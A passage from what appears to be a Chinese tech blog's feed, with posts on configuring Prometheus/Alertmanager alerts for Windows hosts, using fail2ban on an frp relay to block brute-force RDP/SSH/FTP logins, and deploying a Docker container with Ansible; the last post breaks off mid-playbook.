class="hljs-attr">email_configs:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">to:</span> <span class="hljs-string">&#x27;your_email@example.com&#x27;</span><br>    <span class="hljs-attr">send_resolved:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-attr">inhibit_rules:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">source_match:</span><br>    <span class="hljs-attr">severity:</span> <span class="hljs-string">&#x27;critical&#x27;</span><br>  <span class="hljs-attr">target_match:</span><br>    <span class="hljs-attr">severity:</span> <span class="hljs-string">&#x27;warning&#x27;</span><br>  <span class="hljs-attr">equal:</span> [<span class="hljs-string">&#x27;alertname&#x27;</span>, <span class="hljs-string">&#x27;dev&#x27;</span>, <span class="hljs-string">&#x27;instance&#x27;</span>]<br></code></pre></td></tr></table></figure><p>请注意替换以下内容：</p><ul><li><code>smtp.example.com</code>：SMTP服务器地址</li><li><code>alertmanager@example.com</code>：发件人邮箱</li><li><code>your_smtp_password</code>：SMTP密码</li><li><code>your_email@example.com</code>：接收告警的邮箱地址</li></ul><p>这个配置文件设置了全局SMTP配置、路由规则、接收器和抑制规则。</p><h2 id="告警规则配置"><a href="#告警规则配置" class="headerlink" title="告警规则配置"></a>告警规则配置</h2><p>最后，配置告警规则。创建<code>windows_alerts.rules</code>文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">groups:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">windows_alerts</span><br>  <span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">WindowsHighMemoryUsage</span><br>    <span class="hljs-attr">expr:</span> <span class="hljs-number">100</span> <span class="hljs-bullet">-</span> <span class="hljs-string">(windows_os_physical_memory_free_bytes</span> <span class="hljs-string">/</span> <span class="hljs-string">windows_cs_physical_memory_bytes)</span> <span class="hljs-string">*</span> <span class="hljs-number">100</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">70</span><br>    <span class="hljs-attr">for:</span> <span class="hljs-string">1m</span><br>    <span class="hljs-attr">labels:</span><br>      <span class="hljs-attr">severity:</span> <span class="hljs-string">warning</span><br>    <span class="hljs-attr">annotations:</span><br>      <span class="hljs-attr">summary:</span> <span class="hljs-string">&quot;Windows主机内存使用率高 (实例 <span class="hljs-template-variable">&#123;&#123; $labels.instance &#125;&#125;</span>)&quot;</span><br>      <span class="hljs-attr">description:</span> <span class="hljs-string">&quot;Windows主机 <span class="hljs-template-variable">&#123;&#123; $labels.instance &#125;&#125;</span> 的内存使用率超过70%，当前值: <span class="hljs-template-variable">&#123;&#123; $value | printf \&quot;%.2f\&quot; &#125;&#125;</span>%&quot;</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">WindowsHighCPUUsage</span><br>    <span class="hljs-attr">expr:</span> <span class="hljs-number">100</span> <span class="hljs-bullet">-</span> <span class="hljs-string">(avg</span> <span class="hljs-string">by(instance)</span> <span class="hljs-string">(rate(windows_cpu_time_total&#123;mode=&quot;idle&quot;&#125;[5m]))</span> <span class="hljs-string">*</span> <span class="hljs-number">100</span><span class="hljs-string">)</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">90</span><br>    <span class="hljs-attr">for:</span> <span class="hljs-string">5m</span><br>    <span class="hljs-attr">labels:</span><br>      <span class="hljs-attr">severity:</span> <span class="hljs-string">warning</span><br>    <span class="hljs-attr">annotations:</span><br>      <span class="hljs-attr">summary:</span> <span class="hljs-string">&quot;Windows主机CPU使用率高 (实例 <span class="hljs-template-variable">&#123;&#123; $labels.instance &#125;&#125;</span>)&quot;</span><br>      <span class="hljs-attr">description:</span> <span class="hljs-string">&quot;Windows主机 <span class="hljs-template-variable">&#123;&#123; $labels.instance &#125;&#125;</span> 的CPU使用率持续5分钟超过90%，当前值: <span class="hljs-template-variable">&#123;&#123; $value | printf \&quot;%.2f\&quot; &#125;&#125;</span>%&quot;</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">WindowsServerDown</span><br>    <span class="hljs-attr">expr:</span> <span class="hljs-string">up&#123;job=&quot;windows&quot;&#125;</span> <span class="hljs-string">==</span> <span class="hljs-number">0</span><br>    <span class="hljs-attr">for:</span> <span class="hljs-string">5m</span><br>    <span class="hljs-attr">labels:</span><br>      <span class="hljs-attr">severity:</span> <span class="hljs-string">critical</span><br>    <span class="hljs-attr">annotations:</span><br>      <span class="hljs-attr">summary:</span> <span class="hljs-string">&quot;Windows服务器宕机 (实例 <span class="hljs-template-variable">&#123;&#123; $labels.instance &#125;&#125;</span>)&quot;</span><br>      <span class="hljs-attr">description:</span> <span class="hljs-string">&quot;Windows服务器 <span class="hljs-template-variable">&#123;&#123; $labels.instance &#125;&#125;</span> 已经宕机超过5分钟&quot;</span><br></code></pre></td></tr></table></figure><p>这个文件定义了三个告警规则：</p><ol><li>内存使用率高于70%</li><li>CPU使用率持续5分钟高于90%</li><li>Windows服务器宕机超过5分钟</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过以上配置，就成功搭建一个基于Prometheus和Alertmanager的监控告警系统。系统可以监控Windows主机的状态，并在出现问题时发送邮件通知。</p><p>要启动整个系统，只需在包含<code>docker-compose.yml</code>文件的目录中运行：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>之后，您可以通过以下地址访问各个服务：</p><ul><li>Prometheus: <a href="http://localhost:9090/">http://localhost:9090</a></li><li>Grafana: <a href="http://localhost:53000/">http://localhost:53000</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Prometheus和Alertmanager配置教程&quot;&gt;&lt;a href=&quot;#Prometheus和Alertmanager配置教程&quot; class=&quot;headerlink&quot; title=&quot;Prometheus和Alertmanager配置教程&quot;&gt;&lt;/a&gt;Prome</summary>
      
    
    
    
    
    <category term="Prometheus" scheme="http://example.com/tags/Prometheus/"/>
    
  </entry>
  
  <entry>
    <title>使用fail2ban解决基于frp内网穿透的远程桌面爆破问题</title>
    <link href="http://example.com/2024/07/28/%E4%BD%BF%E7%94%A8fail2ban%E8%A7%A3%E5%86%B3%E5%9F%BA%E4%BA%8Efrp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%88%86%E7%A0%B4%E9%97%AE%E9%A2%98/"/>
    <id>http://example.com/2024/07/28/%E4%BD%BF%E7%94%A8fail2ban%E8%A7%A3%E5%86%B3%E5%9F%BA%E4%BA%8Efrp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%88%86%E7%A0%B4%E9%97%AE%E9%A2%98/</id>
    <published>2024-07-28T10:46:33.000Z</published>
    <updated>2024-07-28T10:54:28.368Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用fail2ban解决基于frp内网穿透的远程桌面爆破问题"><a href="#使用fail2ban解决基于frp内网穿透的远程桌面爆破问题" class="headerlink" title="使用fail2ban解决基于frp内网穿透的远程桌面爆破问题"></a>使用fail2ban解决基于frp内网穿透的远程桌面爆破问题</h1><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><p>家中Windows server通过RDP远程桌面进行连接，为方便随时使用，使用frp内网穿透暴露到公网中。但会受到爆破攻击，windows安全策略在失败过多后会锁定账户一段时间，引起不便。</p><p>尝试在Windows端进行安全策略的配置，但基于frp的连接，IP等效于127.0.0.1即本地，故在Windows进行处理比较麻烦。</p><p>故尝试在内网穿透中转服务器上进行处理和拦截。</p><h3 id="Fail2Ban简介"><a href="#Fail2Ban简介" class="headerlink" title="Fail2Ban简介"></a>Fail2Ban简介</h3><p>Fail2Ban 扫描<code>/var/log/auth.log</code>等日志文件，并禁止进行过多失败登录尝试的 IP 地址。它通过更新系统防火墙规则以在可配置的时间内拒绝来自这些 IP 地址的新连接来实现此目的。 Fail2Ban 开箱即用，可以读取许多标准日志文件，例如 sshd 和 Apache 的日志文件，并且可以轻松配置为读取任何日志文件。</p><h2 id="安装fail2ban"><a href="#安装fail2ban" class="headerlink" title="安装fail2ban"></a>安装fail2ban</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># CentOS</span><br>yum install -y fail2ban<br><span class="hljs-comment"># Ubuntu</span><br>sudo apt-get install -y fail2ban<br><span class="hljs-comment"># 验证</span><br>fail2ban-client -h<br></code></pre></td></tr></table></figure><h2 id="编写FRP防爆规则配置文件"><a href="#编写FRP防爆规则配置文件" class="headerlink" title="编写FRP防爆规则配置文件"></a>编写FRP防爆规则配置文件</h2><blockquote><p>规则是使用正则匹配对应的服务名称，所以FRPC启用的名称需要相应匹配，比如SSH服务的FRPC启动服务名为HOME_SSH，则正则为<code>failregex = ^.*\[.*HOME_SSH.*\] get a user connection \[&lt;HOST&gt;:[0-9]*\]</code></p></blockquote><h3 id="防SSH爆破规则文件"><a href="#防SSH爆破规则文件" class="headerlink" title="防SSH爆破规则文件"></a>防SSH爆破规则文件</h3><ol><li><p>编写规则配置文件</p><blockquote><p>注意规则文件名称，下面定义配置文件时需要使用</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/fail2ban/filter.d/frps-ssh-ban.conf<br></code></pre></td></tr></table></figure></li><li><p>写入以下代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[Definition]<br>failregex = ^.*\[.*SSH.*\] get a user connection \[&lt;HOST&gt;:[0-9]*\]<br>ignoreregex =<br></code></pre></td></tr></table></figure></li></ol><h3 id="防FTP爆破规则配置文件"><a href="#防FTP爆破规则配置文件" class="headerlink" title="防FTP爆破规则配置文件"></a>防FTP爆破规则配置文件</h3><ol><li><p>编写规则文件</p><blockquote><p>注意规则文件名称，下面定义配置文件时需要使用</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/fail2ban/filter.d/frps-ftp-ban.conf<br></code></pre></td></tr></table></figure></li><li><p>写入以下代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[Definition]<br>failregex = ^.*\[.*FTP_21.*\] get a user connection \[&lt;HOST&gt;:[0-9]*\]<br>ignoreregex =<br></code></pre></td></tr></table></figure></li></ol><h3 id="防RDP爆破规则配置文件"><a href="#防RDP爆破规则配置文件" class="headerlink" title="防RDP爆破规则配置文件"></a>防RDP爆破规则配置文件</h3><ol><li><p>编写规则文件</p><blockquote><p>注意规则文件名称，下面定义配置文件时需要使用</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/fail2ban/filter.d/frps-rdp-ban.conf<br></code></pre></td></tr></table></figure></li><li><p>写入以下代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[Definition]<br>failregex = ^.*\[.*RDP.*\] get a user connection \[&lt;HOST&gt;:[0-9]*\]<br>ignoreregex =<br></code></pre></td></tr></table></figure></li></ol><h2 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">FRP SSH防爆破</span><br>[frps-ssh-ban]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">是否启用</span><br>enabled = true<br><span class="hljs-meta prompt_"># </span><span class="language-bash">检测时长</span><br>findtime = 3m<br><span class="hljs-meta prompt_"># </span><span class="language-bash">允许的最大重试次数，超过则封锁</span><br>maxretry = 3<br><span class="hljs-meta prompt_"># </span><span class="language-bash">封锁时长</span><br>bantime = 120m<br><span class="hljs-meta prompt_"># </span><span class="language-bash">过滤规则文件，即上面定义的规则文件</span><br>filter = frps-ssh-ban<br><span class="hljs-meta prompt_"># </span><span class="language-bash">存放日志的路径</span><br>logpath = /var/log/frps.log<br><span class="hljs-meta prompt_"># </span><span class="language-bash">匹配协议</span><br>protocol = all<br><span class="hljs-meta prompt_"># </span><span class="language-bash">端口号</span><br>port = all<br><span class="hljs-meta prompt_"># </span><span class="language-bash">拦截动作(基于iptables)</span><br>chain = all<br>action = iptables-allports[name=frps,protocol=tcp]<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">FRP RDP防爆破</span><br>[frps-rdp-ban]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">是否启用</span><br>enabled = true<br><span class="hljs-meta prompt_"># </span><span class="language-bash">检测时长</span><br>findtime = 3m<br><span class="hljs-meta prompt_"># </span><span class="language-bash">允许的最大重试次数，超过则封锁</span><br>maxretry = 6<br><span class="hljs-meta prompt_"># </span><span class="language-bash">封锁时长</span><br>bantime = 30m<br><span class="hljs-meta prompt_"># </span><span class="language-bash">过滤规则文件，即上面定义的规则文件</span><br>filter = frps-rdp-ban<br><span class="hljs-meta prompt_"># </span><span class="language-bash">存放日志的路径</span><br>logpath = /var/log/frps.log<br><span class="hljs-meta prompt_"># </span><span class="language-bash">匹配协议</span><br>protocol = all<br><span class="hljs-meta prompt_"># </span><span class="language-bash">端口号</span><br>port = all<br><span class="hljs-meta prompt_"># </span><span class="language-bash">拦截动作(基于iptables)</span><br>chain = all<br>action = iptables-allports[name=frps,protocol=tcp]<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">FRP FTP防爆破</span><br>[frps-ftp-ban]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">是否启用</span><br>enabled = true<br><span class="hljs-meta prompt_"># </span><span class="language-bash">检测时长</span><br>findtime = 5m<br><span class="hljs-meta prompt_"># </span><span class="language-bash">允许的最大重试次数，超过则封锁</span><br>maxretry = 30<br><span class="hljs-meta prompt_"># </span><span class="language-bash">封锁时长</span><br>bantime = 60m<br><span class="hljs-meta prompt_"># </span><span class="language-bash">过滤规则文件，即上面定义的规则文件</span><br>filter = frps-ftp-ban<br><span class="hljs-meta prompt_"># </span><span class="language-bash">存放日志的路径</span><br>logpath = /var/log/frps.log<br><span class="hljs-meta prompt_"># </span><span class="language-bash">匹配协议</span><br>protocol = all<br><span class="hljs-meta prompt_"># </span><span class="language-bash">端口号</span><br>port = all<br><span class="hljs-meta prompt_"># </span><span class="language-bash">拦截动作(基于iptables)</span><br>chain = all<br>action = iptables-allports[name=frps,protocol=tcp]<br></code></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ol><li><p>验证fail2ban是否成功运行</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">sudo fail2ban-client <span class="hljs-built_in">ping</span><br></code></pre></td></tr></table></figure><p>返回<code>Server replied: pong</code>则表示正常</p></li><li><p>测试并查看日志文件</p><p>查看日志</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sudo tail -f /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/fail2ban.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="查看被Fail2ban封锁的IP"><a href="#查看被Fail2ban封锁的IP" class="headerlink" title="查看被Fail2ban封锁的IP"></a>查看被Fail2ban封锁的IP</h2><ol><li><p>查看SSH被Fail2ban封锁的IP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo fail2ban-client status frps-ssh-ban<br></code></pre></td></tr></table></figure></li><li><p>查看RDP被Fail2ban封锁的IP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo fail2ban-client status frps-rdp-ban<br></code></pre></td></tr></table></figure><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">sudo fail2ban-client status frps-rdp-ban<br>Status for the jail: frps-rdp-ban<br>|<span class="hljs-string">- Filter</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">- Currently failed: 4</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">- Total failed:     968</span><br><span class="hljs-string"></span>|<span class="hljs-string">  `- File list:        /var/log/frps.log</span><br><span class="hljs-string">`- Actions</span><br><span class="hljs-string">   </span>|<span class="hljs-string">- Currently banned: 2</span><br><span class="hljs-string">   </span>|<span class="hljs-string">- Total banned:     7</span><br><span class="hljs-string">   `- Banned IP list:   193.3.19.26 80.94.95.39</span><br></code></pre></td></tr></table></figure></li><li><p>查看FTP被Fail2ban封锁的IP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo fail2ban-client status frps-ftp-ban<br></code></pre></td></tr></table></figure></li></ol><h2 id="解封IP"><a href="#解封IP" class="headerlink" title="解封IP"></a>解封IP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo fail2ban-client set sshd unbanip 193.3.19.26<br></code></pre></td></tr></table></figure><h2 id="可能存在的问题"><a href="#可能存在的问题" class="headerlink" title="可能存在的问题"></a>可能存在的问题</h2><p>frps未开启日志功能导致Fail2ban无法起作用</p><p>方法：修改配置文件，指定日志路径，与Fail2ban中的配置相匹配，重启frps服务</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#日志配置</span><br><span class="hljs-attr">log_file</span> = /var/log/frps.log<br><span class="hljs-attr">log_level</span> = info<br><span class="hljs-attr">log_max_days</span> = <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>参考文章</p><blockquote><p><a href="https://www.alainlam.cn/?p=620">https://www.alainlam.cn/?p=620</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用fail2ban解决基于frp内网穿透的远程桌面爆破问题&quot;&gt;&lt;a href=&quot;#使用fail2ban解决基于frp内网穿透的远程桌面爆破问题&quot; class=&quot;headerlink&quot; title=&quot;使用fail2ban解决基于frp内网穿透的远程桌面爆破问题&quot;&gt;</summary>
      
    
    
    
    
    <category term="服务器" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
    <category term="windows server" scheme="http://example.com/tags/windows-server/"/>
    
    <category term="防火墙" scheme="http://example.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    
  </entry>
  
  <entry>
    <title>Ansible 在多台服务器上部署 Docker 容器</title>
    <link href="http://example.com/2024/07/19/Ansible-%E5%9C%A8%E5%A4%9A%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E9%83%A8%E7%BD%B2-Docker-%E5%AE%B9%E5%99%A8/"/>
    <id>http://example.com/2024/07/19/Ansible-%E5%9C%A8%E5%A4%9A%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E9%83%A8%E7%BD%B2-Docker-%E5%AE%B9%E5%99%A8/</id>
    <published>2024-07-19T02:49:44.000Z</published>
    <updated>2024-07-19T03:02:05.023Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用-Ansible-在多台服务器上部署-Docker-容器"><a href="#使用-Ansible-在多台服务器上部署-Docker-容器" class="headerlink" title="使用 Ansible 在多台服务器上部署 Docker 容器"></a>使用 Ansible 在多台服务器上部署 Docker 容器</h2><p>在这篇博客中，我们将讨论如何使用 Ansible 在多台服务器上部署 Docker 容器。我们将以部署 <code>lobe-chat</code> 容器为例，并介绍如何根据不同的服务器配置特定端口。</p><h3 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h3><p>我有三台服务器，分别对应不同的端口，我需要在这些服务器上定期更新 <code>lobe-chat</code> Docker 容器：</p><ul><li>服务器 <code>192.0.2.1</code> 上的端口 8080</li><li>服务器 <code>192.0.2.2</code> 上的端口 8081</li><li>服务器 <code>192.0.2.3</code> 上的端口 8082</li></ul><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>首先，确保已经安装了 Ansible 和 Docker。可以通过以下命令安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo apt update<br>$ sudo apt install software-properties-common<br>$ sudo apt-add-repository --<span class="hljs-built_in">yes</span> --update ppa:ansible/ansible<br>$ sudo apt install ansible<br></code></pre></td></tr></table></figure><p>确保所有目标服务器都可以通过 SSH 无密码访问。可以通过生成 SSH 密钥并将公钥添加到目标服务器的 <code>~/.ssh/authorized_keys</code> 文件中来实现。</p><h3 id="配置-Ansible-Inventory"><a href="#配置-Ansible-Inventory" class="headerlink" title="配置 Ansible Inventory"></a>配置 Ansible Inventory</h3><p>在 <code>/etc/ansible/hosts</code> 文件中添加目标服务器信息：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[chatservers]</span><br>192.0.2.1<br>192.0.2.2<br>192.0.2.3<br></code></pre></td></tr></table></figure><h3 id="编写-Ansible-Playbook"><a href="#编写-Ansible-Playbook" class="headerlink" title="编写 Ansible Playbook"></a>编写 Ansible Playbook</h3><p>创建一个新的 Ansible Playbook 文件，例如 <code>update_lobe_chat.yml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Manage</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">Docker</span> <span class="hljs-string">container</span> <span class="hljs-string">on</span> <span class="hljs-string">multiple</span> <span class="hljs-string">servers</span><br>  <span class="hljs-attr">hosts:</span> <span class="hljs-string">chatservers</span><br>  <span class="hljs-attr">become:</span> <span class="hljs-literal">yes</span><br><br>  <span class="hljs-attr">vars:</span><br>    <span class="hljs-attr">docker_image:</span> <span class="hljs-string">lobehub/lobe-chat</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">lobe-chat</span><br>    <span class="hljs-attr">host_ports:</span><br>      <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">host:</span> <span class="hljs-string">&quot;192.0.2.1&quot;</span>, <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span> &#125;<br>      <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">host:</span> <span class="hljs-string">&quot;192.0.2.2&quot;</span>, <span class="hljs-attr">port:</span> <span class="hljs-number">8081</span> &#125;<br>      <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">host:</span> <span class="hljs-string">&quot;192.0.2.3&quot;</span>, <span class="hljs-attr">port:</span> <span class="hljs-number">8082</span> &#125;<br><br>  <span class="hljs-attr">tasks:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Set</span> <span class="hljs-string">host-specific</span> <span class="hljs-string">port</span><br>      <span class="hljs-attr">set_fact:</span><br>        <span class="hljs-attr">host_port:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; item.port &#125;&#125;</span>&quot;</span><br>      <span class="hljs-attr">with_items:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; host_ports &#125;&#125;</span>&quot;</span><br>      <span class="hljs-attr">when:</span> <span class="hljs-string">item.host</span> <span class="hljs-string">==</span> <span class="hljs-string">inventory_hostname</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Stop</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">container</span> <span class="hljs-string">if</span> <span class="hljs-string">it</span> <span class="hljs-string">is</span> <span class="hljs-string">running</span><br>      <span class="hljs-attr">docker_container:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; container_name &#125;&#125;</span>&quot;</span><br>        <span class="hljs-attr">state:</span> <span class="hljs-string">stopped</span><br>      <span class="hljs-attr">ignore_errors:</span> <span class="hljs-literal">yes</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Remove</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">container</span> <span class="hljs-string">if</span> <span class="hljs-string">it</span> <span class="hljs-string">exists</span><br>      <span class="hljs-attr">docker_container:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; container_name &#125;&#125;</span>&quot;</span><br>        <span class="hljs-attr">state:</span> <span class="hljs-string">absent</span><br>      <span class="hljs-attr">ignore_errors:</span> <span class="hljs-literal">yes</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Pull</span> <span class="hljs-string">the</span> <span class="hljs-string">latest</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">image</span><br>      <span 